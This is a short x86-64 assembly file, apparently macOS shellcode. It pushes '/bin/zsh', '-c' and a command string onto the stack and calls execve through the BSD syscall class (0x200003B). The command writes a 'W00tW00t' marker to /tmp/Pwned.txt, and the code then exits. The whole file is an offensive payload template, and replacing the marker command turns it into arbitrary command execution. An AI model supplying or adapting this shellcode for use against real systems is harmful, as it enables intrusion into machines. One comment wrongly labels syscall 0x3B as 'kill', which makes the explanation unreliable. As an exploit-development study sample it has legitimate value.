bits 64

global _main

_main:

	xor rcx, rcx 	; NULL Terminator
	push rcx 	; push the NULL Terminator to the stack
	mov rdx, '/bin/zsh' 	;  our file/executable name
	push rdx 	; push the file/executable name to the stack
	mov rdi, rsp 	; fname => 1st argument which by Copy the RSP address to RDI which is the pointer to our file/executable name
	mov rbx, '-c' 	; argp[1] => the 2nd element in the arguments array
	push rbx 	; push argp[1] to the stack
	mov rbx, rsp 	; save the argp[1]('-c') pointer to RBX
	push rcx 	; push the NULL Terminator to the stack
	call array ; call the array label to setup the array for argp
	db 'echo "W00tW00t" > /tmp/Pwned.txt', 0 ; arg[2] which is our command and including the NULL Terminator
	
array:
	push rbx ; arg[1] put the -c pointer into the array
	push rdi ; args[0] which is fname saved before
	mov rsi, rsp ; pass the array pointer for RSI which holds the second argument
	xor rdx, rdx ; empty rdx to use as NULL for the third argument envp
	mov rax, 0x200003B ; The BSD syscall class entry + 0x3B (which is 59 in hex) kill syscall
	syscall ; invoke/execute syscall
	
	mov rax, 0x2000001 ; The BSD syscall class entry + exit syscall
	mov rdi, 0 ; arg int rval
	syscall ; invoke/execute syscall
